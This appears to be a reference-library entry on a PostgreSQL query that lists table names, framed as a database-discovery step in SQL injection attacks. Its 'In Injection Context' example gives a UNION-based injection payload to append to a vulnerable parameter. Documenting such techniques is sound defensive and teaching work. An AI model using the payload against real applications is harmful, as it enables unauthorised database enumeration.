---
id: ebf829b6-434c-4cd7-9b96-88966239a392
name: postgresql-select-tables-from-information-schema
type: command
executor: sql
data: SELECT table_name FROM information_schema.tables
output: null
created_at: '2023-04-06T03:56:35.690499+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - PostgreSQL
tags:
  - sql-injection
  - database-discovery
verified: true
validated: true
---

# postgresql-select-tables-from-information-schema

## Command

```sql
SELECT table_name FROM information_schema.tables
```

## Description

This SQL command queries the information_schema.tables view in PostgreSQL to retrieve the names of all tables in the current database. It is commonly used in SQL injection attacks to enumerate the database schema after exploiting a vulnerable application parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | This is a static query with no parameters; it targets the default information_schema view for the current database. | N/A |

## Examples

### Basic Usage

Execute directly in a PostgreSQL client like psql:

```sql
SELECT table_name FROM information_schema.tables;
```

### In Injection Context

Append to a vulnerable query via UNION:

```sql
' UNION SELECT table_name FROM information_schema.tables --
```

## Expected Output

A list of table names in the database, such as:

```
 table_name 
------------
 users
     orders
   products
(3 rows)
```

If no tables are accessible, an empty result set is returned.

## Related

- [[procedures/PostgreSQL-List-Tables-via-SQL-Injection]]
- [[techniques/System Information Discovery|T1082]]
